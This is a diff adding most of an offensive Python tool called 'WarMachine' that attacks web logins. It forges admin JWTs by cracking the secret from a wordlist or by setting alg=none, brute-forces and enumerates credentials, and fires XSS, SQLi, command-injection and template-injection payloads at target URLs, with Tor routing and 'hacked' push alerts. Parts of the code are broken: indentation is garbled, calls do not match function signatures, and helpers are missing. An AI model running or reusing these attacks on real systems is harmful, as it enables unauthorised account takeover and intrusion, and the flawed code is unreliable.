+async def bypass_flawed_signature_verification(url, cookie, wordlist_file, outputs):
+    async def attempt_fuzzing(secret_key, algorithm):
+        """Attempt to decode the JWT using a provided secret key."""
+        try:
+            # Extract JWT from the token
+            token = extract_jwt_from_set_cookie(cookie)
+            # Decode the token
+            decoded = jwt.decode(token.encode('utf-8'), secret_key, algorithms=[algorithm])
+            logging.info(f"(+) Valid key found: {secret_key}")
+            logging.info(f"(+) Decoded payload: {decoded}")
+            return True, secret_key, decoded
+        except jwt.InvalidSignatureError:
+            return False, None, None
+        except Exception as e:
+            logging.info(f"(-) Error during fuzzing: {e}")
+            # Skip fuzzing if PEM error occurs
+            if "PEM" in str(e):
+                logging.info("(-) PEM file error encountered, skipping fuzzing and attempting a simpler bypass...")
+                return "skip_fuzzing", None, None
+            return False, None, None
+
+          
+        async def fuzz_secret_key(wordlist_file):
+            """Brute-force the secret key using a wordlist."""
+            with open(wordlist_file, 'r') as file:
+                header = jwt.get_unverified_header(token.encode('utf-8'))
+                algorithm = header.get("alg")
+                if not algorithm:
+                    logging.info("(-) Algorithm not found in JWT header.")
+                    return None, None
+                else:
+                    logging.info(f"(+) Algorithm: {algorithm}")
+    
+                for secret_key in file:
+                    secret_key = secret_key.strip()  # Clean up whitespace/newline
+                    valid, found_key, payload = await attempt_fuzzing(secret_key, algorithm)
+                    if valid == "skip_fuzzing":
+                        return "skip_fuzzing", None
+                    elif valid:
+                        return found_key, payload
+        return None, None
+        
+        # Start fuzzing the secret key
+        logging.info("(+) Attempting to crack JWT secret...")
+        found_key, payload = await fuzz_secret_key(wordlist_file)
+        
+        # If fuzzing was skipped or no valid secret key was found, try simpler bypass
+        if found_key == "skip_fuzzing" or not found_key:
+            logging.info("(-) No valid secret key found or fuzzing was skipped. Attempting simpler bypass with alg=none.")
+            
+            # Split JWT into header, payload, and signature
+            header, payload, signature = token.split('.')
+
+        # Decode the payload (base64 -> bytes -> string -> dict)
+        decoded_payload = base64.urlsafe_b64decode(payload + '=' * (-len(payload) % 4))
+        payload_dict = json.loads(decoded_payload.decode())
+    
+        # Modify the payload to escalate privileges
+        payload_dict['sub'] = 'administrator'
+        logging.info(f"(+) Modified payload: {json.dumps(payload_dict, indent=4)}")
+    
+        # Re-encode the modified payload (Base64 URL encoding)
+        modified_payload_b64 = base64.urlsafe_b64encode(json.dumps(payload_dict).encode()).rstrip(b'=').decode()
+    
+        # Modify the header to set "alg" to "none"
+        header_dict = json.loads(base64.urlsafe_b64decode(header + '=' * (-len(header) % 4)).decode())
+        header_dict['alg'] = 'none'
+        modified_header_b64 = base64.urlsafe_b64encode(json.dumps(header_dict).encode()).rstrip(b'=').decode()
+    
+        # Create the modified token (header.payload.) - no signature
+        modified_token = f"{modified_header_b64}.{modified_payload_b64}."
+        logging.info(f"(+) Modified JWT token (alg=none): {modified_token}\n")
+    
+        login_success = await login_with_jwt_comparison(url, modified_token, 'administrator', outputs)
+        
+        if login_success:
+            logging.info("(+) JWT token successfully logged in.")
+            logging.info(f"(+) Secret key found: {found_key}")
+        else:
+            logging.error("(-) JWT token login failed.")
+       
+            
+            
+            # Modify the payload to escalate privileges
+            payload['sub'] = 'administrator'
+            logging.info(f"(+) Modified payload: {json.dumps(payload, indent=4)}")
+    
+            # Re-sign the JWT with the cracked secret key
+            header = jwt.get_unverified_header(token.encode('utf-8'))
+            new_jwt_token = jwt.encode(payload, found_key, algorithm=header['alg'])
+        
+        logging.info(f"(+) Modified and re-signed JWT: {new_jwt_token}")
+    
+        login_success = await login_with_jwt_comparison(url, new_jwt_token, 'administrator', outputs)
+        
+        if login_success:
+            logging.info("(+) JWT token successfully logged in.")
+        else:
+            logging.error("(-) JWT token login failed.")
+
+
+# Function to brute-force passwords for a given username
+async def narrow_down_password(url, username, passwords, outputs):
+    """Try a range of passwords for a given username, including CSRF token."""
+    for password in passwords:
+        result = await login(url, username, password)
+        if result:  # Check if the login attempt was successful
+            username, password, jwt_token = result
+            logging.info(f"Valid password found for {username}: {password}")
+            await save_credentials_to_file(username, password, outputs)
+            return username, password, jwt_token  # Return JWT immediately after finding the valid password
+        else:
+            logging.info(f"(-) Password {password} failed for user {username}.")
+    return None, None, None
+
+# Full attack sequence combining enumeration and password brute-forcing
+async def brute_force_all_users_passwords(url, usernames, passwords, outputs):
+    """Brute-force usernames and passwords."""
+    for username in usernames:
+        username, password, jwt_token = await narrow_down_password(url, username, passwords, outputs)
+        if password:
+            await save_credentials_to_file(username, password, outputs)
+            return username, password, jwt_token  # Exit brute force immediately after finding valid credentials
+    logging.error("(-) Brute force failed to find valid credentials.")
+    return None, None, None
+
+# Function to extract error messages from the response
+def extract_error_message(response_text):
+    """Extract and return error messages from the response."""
+    soup = BeautifulSoup(response_text, 'html.parser')
+
+    # Find and extract the error message or surrounding context
+    error_message = soup.find(string="Invalid username or password.")
+    
+    # Return the exact error message or fallback to first 500 chars if not found
+    if error_message:
+        return error_message.strip()
+    return soup.get_text()[:500]  # Fallback: Return first 500 chars if not found
+
+# Function to brute-force usernames with a static password (basic username enumeration)
+async def brute_force_username(url, usernames, static_password, outputs):
+    """Brute-force usernames with a static password."""
+    logging.info("(+) Scraping baseline response for an invalid login attempt...")
+
+    # Baseline request to get a standard response
+    baseline_response = await login(url, 'invalid_user', static_password)
+    
+    baseline_message = extract_error_message(baseline_response.text)
+    baseline_length = len(baseline_response.text)
+
+    logging.info(f"(+) Baseline error message: '{baseline_message}'")
+    logging.info(f"(+) Baseline response length: {baseline_length}")
+
+    # Iterate over the usernames and submit login attempts
+    for username in usernames:
+        # Extract the current response message and length
+        current_response = await login(url, username, static_password)
+        current_message = extract_error_message(current_response.text)
+        current_length = len(current_response.text)
+
+        logging.info(f"Testing username: {username} | Response length: ({baseline_length} : {current_length})")
+        
+        # Check if error message indicates an incorrect password (valid username)
+        if "incorrect password" in current_message.lower() and baseline_length != current_length:
+            logging.info(f"Valid username found based on error message: {username}")
+            username, password, jwt_token = await narrow_down_password(url, username, 'FakePass', outputs)
+            await save_credentials_to_file(username, password, outputs)
+            return username, password, jwt_token
+
+        # Check for subtle differences in response message or length
+        elif baseline_message != current_message:
+            logging.info(f"Valid username found based on subtle difference: {username}")
+            username, password, jwt_token = await narrow_down_password(url, username, 'FakePass', outputs)
+            await save_credentials_to_file(username, password, outputs)
+            return username, password, jwt_token
+        else:
+            logging.info(f"Tried {username}, not valid.")
+
+    return None, None, None
+
+
+
+
+async def Auth_Aussalt(valid_user, valid_password, attack_server, outputs, url_list, password_list, users_list):
+    logging.info(f"(+) User input: {valid_user[0]} | {valid_password[0] if valid_password else 'None'}")
+    
+    content = await read_file(url_list)
+    urls = content.splitlines()
+    content = await read_file(password_list)
+    password_list = content.splitlines()
+    content = await read_file(users_list)
+    users_list = content.splitlines()
+    
+    logging.debug(f"Loaded {len(urls)} URL from file.")
+    logging.debug(f"Loaded {len(password_list)} passwords from file.")
+    logging.debug(f"Loaded {len(users_list)} usernames from file.")
+
+    
+    # Continue until we have both a valid user and a valid password
+    while not valid_password[0] or not valid_user[0]:
+        # Iterate through each URL in the list
+        for url in urls:
+            try:
+                # If only the user is valid, brute force the password
+                if valid_user[0] and not valid_password[0]:
+                    logging.info("Only user is valid, brute-forcing password.")
+                    username, password, jwt_token = await narrow_down_password(url, valid_user[0], password_list, outputs)
+                # If only the password is valid, brute force the username
+                elif valid_password[0] and not valid_user[0]:
+                    logging.info("Only password is valid, brute-forcing user.")
+                    username, password, jwt_token = await brute_force_username(url, users_list, valid_password[0], outputs)
+                # If neither user nor password is valid, brute force both
+                elif not valid_password[0] and not valid_user[0]:
+                    logging.info("User & password are invalid, brute-forcing all users and passwords.")
+                    username, password, jwt_token = await brute_force_all_users_passwords(url, users_list, password_list, outputs)
+                # If both user and password are provided, try to log in
+                elif valid_user[0] and valid_password[0]:
+                    logging.info("Both user and password are provided and non-empty. Proceeding with login.")
+                    username, password, jwt_token = await login(url, valid_user[0], valid_password[0])
+                else:
+                    logging.error("(-) No valid credentials provided.")
+                    continue
+                
+                # If login is successful, update valid_user and valid_password
+                if jwt_token:
+                    valid_user[0] = username
+                    valid_password[0] = password
+                    logging.info(f"(+) Successful login with user: {username} and password: {password}")
+                    # Proceed with JWT-based attack if valid credentials are found
+                    await asyncio.gather(
+                        bypass_flawed_signature_verification(url, jwt_token, outputs),
+                        jwt_bypass_jwk_injection(url, jwt_token, outputs),
+                        jku_header_injection(url, attack_server, jwt_token, outputs)
+                    )
+                    # Do not exit loop; continue to handle other tasks
+                else:
+                    logging.warning(f"(-) Failed login attempt for URL: {url}")
+            
+            # Handle exceptions that may occur during the await calls
+            except Exception as e:
+                logging.error(f"(x) Exception occurred while processing URL: {url} - {str(e)}")
+                continue  # Move to the next URL in case of an error
+
+
+# Function to load URLs from file
+def load_urls(file_path):
+    with open(file_path, 'r') as f:
+        return [line.strip() for line in f if line.strip()]
+
+# Helper function to save results to a file
+def save_result(outputs_path, filename, message):
+    with open(f"{outputs_path}/attacks/{filename}", "a") as file:
+        file.write(f"{message}\n")
+
+
+
+
+# Function to load payloads from file
+def load_payloads(file_path):
+    payloads = []
+    with open(file_path, 'r') as f:
+        for line in f:
+            line = line.strip()  # Remove any extraneous whitespace
+            if line and not line.startswith('#'):  # Ignore comments
+                payloads.append(str(line))  # Ensure the payload is treated as a string
+    return payloads
+
+# Function to check for potential XSS execution based on response length
+async def check_xss_response(session, url, payload):
+    try:
+        # Send the original request without payload to get the baseline response size
+        async with session.get(url) as baseline_response:
+            baseline_text = await baseline_response.text()
+            baseline_length = len(baseline_text)
+            logging.info(f"Baseline length for {url}: {baseline_length} bytes")
+
+        # Send the request with the XSS payload
+        async with session.get(f"{url}{quote(payload)}") as response:
+            text_with_payload = await response.text()
+            payload_length = len(str(text_with_payload))
+            logging.info(f"Payload response length for {url}: {payload_length} bytes")
+            
+            soup = BeautifulSoup(text_with_payload.lower, 'html.parser')
+            # Compare response lengths
+            if response.status == 200 and payload.lower in soup.text:
+                logging.info(f"XSS payload reflected in response text at {url} with payload {payload}")
+                return f"VULNERABLE (XSS - Reflected Content): {url} with payload {payload}"
+
+    except Exception as e:
+        logging.error(f"Error checking {url} with payload {payload}: {e}")
+    return None
+
+# Core injection testing function
+async def injection_attacks(url_list, xss_payloads_file, sqli_payloads_file, cmd_injection_payloads_file, template_injection_payloads_file, outputs):
+    # SSL context for secure requests
+    ssl_context = ssl.create_default_context(cafile=certifi.where())
+    ssl_context.options |= ssl.OP_NO_TLSv1_3  # Optional: Disable TLS 1.3 if needed
+    ssl_context.options |= ssl.OP_NO_SSLv3    # Disable SSLv3 for stronger security
+
+    # Timeout settings for aiohttp
+    timeout = aiohttp.ClientTimeout(total=30, connect=10, sock_read=10, sock_connect=10)
+
+    # Load payloads and URLs from files
+    xss_payloads = load_payloads(xss_payloads_file)
+    sqli_payloads = load_payloads(sqli_payloads_file)
+    cmd_injection_payloads = load_payloads(cmd_injection_payloads_file)
+    template_injection_payloads = load_payloads(template_injection_payloads_file)
+    urls = load_payloads(url_list)
+
+    # Dictionary to store payload types
+    payload_types = {
+        'XSS': xss_payloads,
+        'SQL Injection': sqli_payloads,
+        'Command Injection': cmd_injection_payloads,
+        'Template Injection': template_injection_payloads
+    }
+
+    async with aiohttp.ClientSession(timeout=timeout) as session:
+        for url in urls:
+            for injection_type, payloads in payload_types.items():
+                success_detected = False  # Track if a vulnerability is found
+
+                for payload in payloads:
+                    # Ensure the URL already has the correct parameter structure
+                    
+                    full_url = f"{url}{quote(payload)}"  # Append payload directly
+                    #XSSresult = await check_xss_response(session, url, payload)
+                    
+                    XSSresult = bane.XSS_Scanner.scan(url,payload=payload, http_proxies='http:127.0.0.1:8080')
+
+                    try:
+                        async with session.get(full_url, ssl=ssl_context) as response:
+                            logging.info(f"HTTP Request: GET {full_url} - Status Code: {response.status}")
+
+                            
+                            
+                            if response.status == 200:
+                                text = await response.text()
+
+                                # Check for vulnerabilities based on response content
+                                if injection_type == 'XSS' and XSSresult:
+                                    message = f"VULNERABLE (XSS): {full_url} with payload {payload}"
+                                    save_result(outputs, 'XSS_Success.txt', message)
+                                    logging.info(message)
+                                    success_detected = True
+                                    await send_pushover_notification(message, sound_key='hacked')
+
+                                elif injection_type == 'SQL Injection' and re.search(r"(sql|database|syntax|ORA-|SQLSTATE)", text, re.IGNORECASE):
+                                    message = f"VULNERABLE (SQL Injection): {full_url} with payload {payload}"
+                                    save_result(outputs, 'SQLI_Success.txt', message)
+                                    logging.info(message)
+                                    success_detected = True
+                                    await send_pushover_notification(message, sound_key='hacked')
+
+                                elif injection_type == 'Command Injection' and re.search(r"(command not found|syntax error|illegal operation)", text, re.IGNORECASE):
+                                    message = f"VULNERABLE (Command Injection): {full_url} with payload {payload}"
+                                    save_result(outputs, 'CI_Success.txt', message)
+                                    logging.info(message)
+                                    success_detected = True
+                                    await send_pushover_notification(message, sound_key='hacked')
+
+                                elif injection_type == 'Template Injection' and re.search(r"(jinja|render|template|twig|mustache)", text, re.IGNORECASE):
+                                    message = f"VULNERABLE (Template Injection): {full_url} with payload {payload}"
+                                    save_result(outputs, 'SSTI_Success.txt', message)
+                                    logging.info(message)
+                                    success_detected = True
+                                    await send_pushover_notification(message, sound_key='hacked')
+
+                                if success_detected:
+                                    # Stop testing further payloads for this URL and injection type
+                                    break
+                    except Exception as e:
+                        logging.error(f"Error testing {full_url} with {injection_type}: {e}")
+
+                    if success_detected:
+                        break  # Exit the loop for this URL once a vulnerability is found
+
+
+            
+# Main function that orchestrates the entire scanning process
+async def main(output_queue):
+    try:
+        check_root()
+        logging.debug("Starting main function.")
+        # Initialize user input or default input handling
+        if len(sys.argv) >= 6:
+            IP = sys.argv[1] # Target URL
+            LV = sys.argv[2]  
+            valid_user = sys.argv[3].split(',')  # List of usernames
+            valid_password = sys.argv[4].split(',')  # List of passwords
+            attack_server = sys.argv[5]  # Attack server URL
+        else:
+            print("Usage: python3 script_name.py <arg1> <arg2> <arg3>")
+            print("sudo python3 ~/tools/PythonScripts/WarMachineBETA.py <IP> <user> <LV:0-5'1,3,5 faster scans higher number deeper enumeration'> (1 = Smaller wordlist) <speed:0|1> (0 = A faster scan 'LOUDER'")
+            print("Example:")
+            print("sudo python3 ~/tools/PythonScripts/WarMachineBETA.py X.X.X.X blanco 0")
+            IP = input("URL or IP: ").strip()
+            LV = int(input("0-5: " ))
+            valid_user = input("USER (comma-separated list): ").split(',')
+            valid_password = input("PASS (comma-separated list): ").split(',')
+            attack_server = input("Attack Server: ").strip()
+
+
+             
+
+        
+        # Set Speed, sublist and dirlist based on enumeration level
+        if LV == 0:
+            users_list, password_list, xss_payloads, sqli_payloads, cmd_injection_payloads, template_injection_payloads, sublist, dirlist, paralist, speed, speed_option = ('/usr/share/wordlists/seclists/Usernames/users.txt', '/usr/share/wordlists/pass.txt', '/usr/share/wordlists/seclists/Fuzzing/XSS/robot-friendly/XSS-Fuzzing.txt', '/usr/share/wordlists/seclists/Fuzzing/SQLi/quick-SQLi.txt', '/usr/share/wordlists/seclists/Fuzzing/allCOMMANDS.txt', '/usr/share/wordlists/seclists/Fuzzing/allSSTI.txt', '/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt', '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt', '/usr/share/wordlists/paramlist/params.txt', '-t 60', '-T2')
+        elif LV == 1:
+            users_list, password_list, xss_payloads, sqli_payloads, cmd_injection_payloads, template_injection_payloads, sublist, dirlist, paralist, speed, speed_option = ('/usr/share/wordlists/seclists/Usernames/users.txt', '/usr/share/wordlists/pass.txt', '/usr/share/wordlists/seclists/Fuzzing/XSS/robot-friendly/XSS-Fuzzing.txt', '/usr/share/wordlists/seclists/Fuzzing/SQLi/quick-SQLi.txt', '/usr/share/wordlists/seclists/Fuzzing/allCOMMANDS.txt', '/usr/share/wordlists/seclists/Fuzzing/allSSTI.txt', '/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt', '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt','/usr/share/wordlists/paramlist/params.txt', '-t 60', '-T4')    
+        elif LV == 2:
+            users_list, password_list, xss_payloads, sqli_payloads, cmd_injection_payloads, template_injection_payloads, sublist, dirlist, paralist, speed, speed_option = ('/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt', '/usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords.txt', '/usr/share/wordlists/seclists/Fuzzing/XSS/robot-friendly/XSS-Cheat-Sheet-PortSwigger.txt', '/usr/share/wordlists/seclists/Fuzzing/SQLi/Generic-SQLi.txt', '/usr/share/wordlists/seclists/Fuzzing/allCOMMANDS.txt', '/usr/share/wordlists/seclists/Fuzzing/allSSTI.txt', '/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt', '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt', '/usr/share/wordlists/paramlist/params.txt', '-t 10', '-T2')
+        elif LV == 3:
+            users_list, password_list, xss_payloads, sqli_payloads, cmd_injection_payloads, template_injection_payloads, sublist, dirlist, paralist, speed, speed_option = ('/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt', '/usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords.txt', '/usr/share/wordlists/seclists/Fuzzing/XSS/robot-friendly/XSS-Cheat-Sheet-PortSwigger.txt', '/usr/share/wordlists/seclists/Fuzzing/SQLi/Generic-SQLi.txt', '/usr/share/wordlists/seclists/Fuzzing/allCOMMANDS.txt', '/usr/share/wordlists/seclists/Fuzzing/allSSTI.txt', '/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt', '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt', '/usr/share/wordlists/paramlist/parameters.txt', '-t 60', '-T4')
+        elif LV == 4:
+            users_list, password_list, xss_payloads, sqli_payloads, cmd_injection_payloads, template_injection_payloads, sublist, dirlist, paralist, speed, speed_option = ('/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt', '/usr/share/wordlists/rockyou.txt', '/usr/share/wordlists/seclists/Fuzzing/XSS/robot-friendly/allXSS.txt', '/usr/share/wordlists/seclists/Fuzzing/SQLi/allSQLI.txt', '/usr/share/wordlists/seclists/Fuzzing/allCOMMANDS.txt', '/usr/share/wordlists/seclists/Fuzzing/allSSTI.txt', '/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt', '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt', '/usr/share/wordlists/paramlist/parameters.txt', '-t 10', '-T2')
+        elif LV == 5:
+            users_list, password_list, xss_payloads, sqli_payloads, cmd_injection_payloads, template_injection_payloads, sublist, dirlist, paralist, speed, speed_option = ('/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt', '/usr/share/wordlists/rockyou.txt', '/usr/share/wordlists/seclists/Fuzzing/XSS/robot-friendly/allXSS.txt', '/usr/share/wordlists/seclists/Fuzzing/SQLi/allSQLI.txt', '/usr/share/wordlists/seclists/Fuzzing/allCOMMANDS.txt', '/usr/share/wordlists/seclists/Fuzzing/allSSTI.txt', '/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt', '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt', '/usr/share/wordlists/paramlist/parameters.txt', '-t 60', '-T4')
+        else:
+            raise ValueError("Invalid value for EnumLV")
+    
+        logging.info(f"Sublist: {sublist}")
+        logging.info(f"Dirlist: {dirlist}")
+    
+           
+        # Check for web proxy and Tor
+        webproxy, ffuf2burp = '', '-replay-proxy http://127.0.0.1:8080' if await check_webproxy() else ''
+        tor = 'proxychains' if await check_tor(IP) else ''
+        # Corrected line to log Tor setting
+        logging.info(f"Tor setting: {tor}")
+    
+    
+        # Prepare directories and logs
+        outputs = os.getcwd() + '/WarData'
+        log_file = os.path.join(outputs, "script_log.txt")
+        user = os.getlogin()
+        url_list = f"{outputs}/recon/URL.log"
+        inject_list = f"{outputs}/recon/inject.txt"    
+        logging.info(f"Current working directory: Current User {outputs} : {user}")
+        
+        # Prepare directories asynchronously
+        await prepare_directories(outputs, IP, user, log_file)
+    
+    
+        # Check for web proxy and Tor
+        webproxy, ffuf2burp = '', '-replay-proxy http://127.0.0.1:8080' if await check_webproxy() else ''
+        tor = 'proxychains' if await check_tor(IP) else ''
+        
+        # Create the details dictionary to hold scan information
+        details = initialize_details(tor, webproxy, ffuf2burp, IP)
+    
+        # Wordlist for secret key cracking
+        
+        # Read the password file with error handling for encoding issues
+        # Reading the entire file into memory may be problematic for large files
+        
+        
+        await send_pushover_notification(f"WarMachine is scanning {IP}", sound_key='scanning')
+       
+        await enumeration_stage(IP, details, dirlist, sublist, paralist, tor, ffuf2burp, url_list, speed, outputs, output_queue, log_file)
+        
+        await injection_attacks(inject_list, xss_payloads, sqli_payloads, cmd_injection_payloads, template_injection_payloads, outputs)
+     
+        '''
+        await Processes_URLS(f"{outputs}/recon/URL.log", outputs)
+        logging.info('Processesing URLs')
+        await Processes_URLS(inject_list, outputs)
+        logging.info('Processesing URLs')
+        
+        # Run fingerprint_stage and other stages asynchronously
+        await asyncio.gather(
+            fingerprint_stage(IP, tor, webproxy, ffuf2burp, speed_option, outputs, details, output_queue, log_file),
+            Auth_Aussalt(valid_user, valid_password, attack_server, outputs, url_list, password_list, users_list),
+            injection_attacks(url, xss_payloads, sqli_payloads, cmd_injection_payloads, template_injection_payloads)
+        )
+
+        '''
+        
+        
+        
+    except KeyboardInterrupt:
+        logging.info("(x) Process interrupted by user.")
+    except Exception as e:
+        logging.error(f"(x) Unexpected error occurred: {str(e)}")
+    finally:
+        logging.info("(+) Program finished gracefully.")
+        # Create ThankYou.txt and exit
+        async with aiofiles.open("ThankYou.txt", "w") as file:
+            await file.write("Thank you for using WarMachine by Blanco\n")
+    
+
+# Display output using curses
+async def display_output(stdscr, output_queue, fingerprint_file):
+    WIDTH = 20
+    HEIGHT = 10
+    SNAKE_CHAR = 'O'
+    FOOD_CHAR = '1'
+    EMPTY_CHAR = ' '
+
+    UP = 'w'
+    DOWN = 's'
+    LEFT = 'a'
+    RIGHT = 'd'
+
+    DIRECTION_VECTORS = {
+        UP: (-1, 0),
+        DOWN: (1, 0),
+        LEFT: (0, -1),
+        RIGHT: (0, 1)
+    }
+
+    class SnakeGame:
+        def __init__(self, snake_win, info_win, fingerprint_file, output_queue):
+            self.snake_win = snake_win
+            self.info_win = info_win
+            self.fingerprint_file = fingerprint_file
+            self.output_queue = output_queue
+            self.initialize_game()
+
+        def initialize_game(self):
+            self.board = [[EMPTY_CHAR] * WIDTH for _ in range(HEIGHT)]
+            self.snake = [(HEIGHT // 2, WIDTH // 2)]
+            self.direction = random.choice([UP, DOWN, LEFT, RIGHT])
+            self.food = self.place_food()
+            self.board[self.snake[0][0]][self.snake[0][1]] = SNAKE_CHAR
+            self.game_over = False
+            self.snake_color = random.randint(1, 7)
+            self.snake_win.attron(curses.color_pair(self.snake_color))
+
+        def place_food(self):
+            while True:
+                food_position = (random.randint(0, HEIGHT - 1), random.randint(0, WIDTH - 1))
+                if food_position not in self.snake:
+                    self.board[food_position[0]][food_position[1]] = FOOD_CHAR
+                    return food_position
+
+        def change_direction(self):
+            head_y, head_x = self.snake[0]
+            food_y, food_x = self.food
+
+            if head_y < food_y:
+                new_direction = DOWN
+            elif head_y > food_y:
+                new_direction = UP
+            elif head_x < food_x:
+                new_direction = RIGHT
+            elif head_x > food_x:
+                new_direction = LEFT
+            else:
+                new_direction = self.direction
+
+            dy, dx = DIRECTION_VECTORS[new_direction]
+            new_head = (head_y + dy, head_x + dx)
+            if new_head in self.snake:
+                new_direction = self.direction
+
+            self.direction = new_direction
+
+        def move_snake(self):
+            head_y, head_x = self.snake[0]
+            dy, dx = DIRECTION_VECTORS[self.direction]
+            new_head = (head_y + dy, head_x + dx)
+
+            if (0 <= new_head[0] < HEIGHT) and (0 <= new_head[1] < WIDTH) and (new_head not in self.snake):
+                self.snake.insert(0, new_head)
+                if new_head == self.food:
+                    self.food = self.place_food()
+                else:
+                    tail = self.snake.pop()
+                    self.board[tail[0]][tail[1]] = EMPTY_CHAR
+                self.board[new_head[0]][new_head[1]] = SNAKE_CHAR
+            else:
+                self.game_over = True
+
+        def display(self):
+            self.snake_win.clear()
+            for row in self.board:
+                self.snake_win.addstr(''.join(row) + '\n')
+            self.snake_win.addstr(f'Score: {len(self.snake) - 1}\n')
+            self.snake_win.refresh()
+
+        async def play(self):
+            while True:
+                self.initialize_game()
+                while not self.game_over:
+                    self.display()
+                    self.change_direction()
+                    self.move_snake()
+                    await self.update_info_win()
+                    await asyncio.sleep(0.2)
+                self.display()
+                try:
+                    self.snake_win.addstr('Game Over!\n')
+                    self.snake_win.refresh()
+                    await asyncio.sleep(2)
+                except curses.error:
+                    pass
+
+        async def update_info_win(self):
+            self.info_win.clear()
+            self.info_win.addstr('Scanning...\n')
+            try:
+                async with aiofiles.open(self.fingerprint_file, 'r') as file:
+                    async for line in file:
+                        self.info_win.addstr(line)
+            except FileNotFoundError:
+                self.info_win.addstr('Fingerprint file not found.\n')
+            except curses.error:
+                pass  # Ignore curses errors caused by trying to write too much text
+            while not self.output_queue.empty():
+                message = await self.output_queue.get()
+                lines = message.split('\n')
+                for line in lines:
+                    try:
+                        self.info_win.addstr(line[:self.info_win.getmaxyx()[1] - 1] + '\n')
+                    except curses.error:
+                        pass
+            self.info_win.refresh()
+
+    curses.curs_set(0)
+    curses.start_color()
+    for i in range(1, 8):
+        curses.init_pair(i, i, curses.COLOR_BLACK)
+    snake_win = curses.newwin(HEIGHT + 2, WIDTH + 2, 0, 0)
+    info_win = curses.newwin(HEIGHT + 2, WIDTH * 2, 0, WIDTH + 3)
+    game = SnakeGame(snake_win, info_win, fingerprint_file, output_queue)
+    await game.play()
+
+
+
+def handle_exit(signum, frame):
+    for task in asyncio.all_tasks():
+        task.cancel()
+
+signal.signal(signal.SIGINT, handle_exit)
+signal.signal(signal.SIGTERM, handle_exit)
+
+async def main_program():
+    output_queue = asyncio.Queue()
+    fingerprint_file = os.path.join(os.getcwd(), "fingerprint.txt")
+
+    main_task = asyncio.create_task(main(output_queue))
+    curses_task = asyncio.create_task(curses.wrapper(display_output, output_queue, fingerprint_file))
+
+    # Await both tasks and ensure proper cancellation
+    try:
+        await asyncio.gather(main_task, curses_task)
+    except asyncio.CancelledError:
+        logging.info("Tasks were cancelled.")
+
+if __name__ == "__main__":
+    try:
+        asyncio.run(main_program())
+    except RuntimeError as e:
+        logging.error(f"RuntimeError occurred: {e}")
+
